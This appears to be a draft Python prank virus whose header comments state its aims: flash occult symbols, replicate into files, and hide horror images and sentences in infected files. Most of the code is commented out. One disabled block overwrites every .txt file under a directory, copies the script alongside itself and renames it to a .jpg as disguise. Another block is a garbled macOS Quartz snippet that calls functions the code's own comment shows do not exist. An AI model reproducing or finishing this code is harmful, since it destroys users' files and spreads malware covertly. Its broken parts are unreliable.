# the purpose of the program is :
    # 1. at runtime, starts to display more and more occult symbols as time goes by, 
        # which disappear almost immediately after their appearance.
    # 2. replicates itself in files: with each infected file (thus with each replication), a horrific image is displayed, 
        # then disappears almost immediately. 
        # So as time goes by, more and more horrific images will be displayed, faster and more often.
    # 3. modifies infected files to hide occult symbols, horrific images, and creepy sentences.



import os
import shutil
import random
import time
import tkinter as tk
import pyautogui
from PIL import Image, ImageDraw, ImageFont
import Quartz
import objc


# here is the list of occult symbols to display on user screen
symbols = ['☥', '☦', '☧', '☨', '☩', '☫', '☬', '☼', '☽', '☾', '☿', '♀', '♁', '♂', '♃', '♄', '♅', '♆', '♇', '♈', '♉', '♊', '♋', '♌', '♍', '♎', '♏', '♐', '♑', '♒', '♓', '♙', '♰', '♱']


import sys # to access the system
import cv2
from threading import Timer

def open():
    img = cv2.imread("test.jpg", cv2.IMREAD_ANYCOLOR)
    cv2.imshow("I SEE YOU", img)
    cv2.waitKey(1000)
    cv2.destroyAllWindows() # destroy all windows
    sys.exit() # to exit from all the processes
   

open()

'''

# Generate a random symbol
symbol = symbols[random.randint(0, len(symbols) - 1)]
image_path = "/test.jpg"

image = Quartz.Image.ImageWithName(image_path) # AttributeError: module 'Quartz' has no attribute 'Image'

width, height = image.size()
rect = ((Quartz.CGDisplayPixelsWide(0) - width) / 2, (Quartz.CGDisplayPixelsHigh(0) - height) / 2, width, height)
options = {Quartz.kCGWindowBounds: rect, Quartz.kCGWindowName: "image", Quartz.kCGWindowLevel: Quartz.kCGDesktopWindowLevel}
cg_image = image.CGImageForProposedRect(None, None, None)
window_id = Quartz.CGWindowListCreateImage(rect, Quartz.kCGWindowListOptionOnScreenBelowWindow, Quartz.kCGNullWindowID, Quartz.kCGWindowImageDefault)
image_region = Quartz.CGRectMake(0, 0, width, height)
image_provider = Quartz.CGImageGetDataProvider(cg_image)
image_data = Quartz.CGDataProviderCopyData(image_provider)
image_ref = Quartz.CGImageCreate(width, height, 8, 32, width * 4, Quartz.CGColorSpaceCreateDeviceRGB(), Quartz.kCGImageAlphaNoneSkipFirst, image_data, None, False, Quartz.kCGRenderingIntentDefault)
options[Quartz.kCGWindowID] = window_id
options[Quartz.kCGImageProviderVisualContext] = Quartz.CGImageGetBitmapContext(image_ref)
image_event = objc.objc_object(c_void_p=Quartz.CGEventCreate(None))
Quartz.CGEventSetLocation(image_event, rect[0], rect[1])
window_id = Quartz.CGWindowListCreateImage(image_region, Quartz.kCGWindowListOptionOnScreenBelowWindow, window_id, Quartz.kCGWindowImageDefault)
options[Quartz.kCGWindowID] = window_id
Quartz.CGEventPost(Quartz.kCGHIDEventTap, image_event)
Quartz.CGDisplayForceToGray(False)
'''


"""


# Navigate to the target directory
os.chdir('/path/to/target/directory')

# Modify files and create a copy of the script
for root, dirs, files in os.walk('.'):
    for file in files:
        if file.endswith('.txt'):
            with open(os.path.join(root, file), 'w') as f:
                f.write('This file has been modified by the script')
        elif file == 'script.py':
            shutil.copy('script.py', os.path.join(root, 'copy_of_script.py'))

# Create and display a random image
image = Image.new('RGB', (500, 500))
image.show()

# Hide the script in user files
with open('hidden_file.txt', 'w') as f:
    f.write('This file contains occult symbols and images')
os.rename('script.py', 'hidden_file.jpg')

"""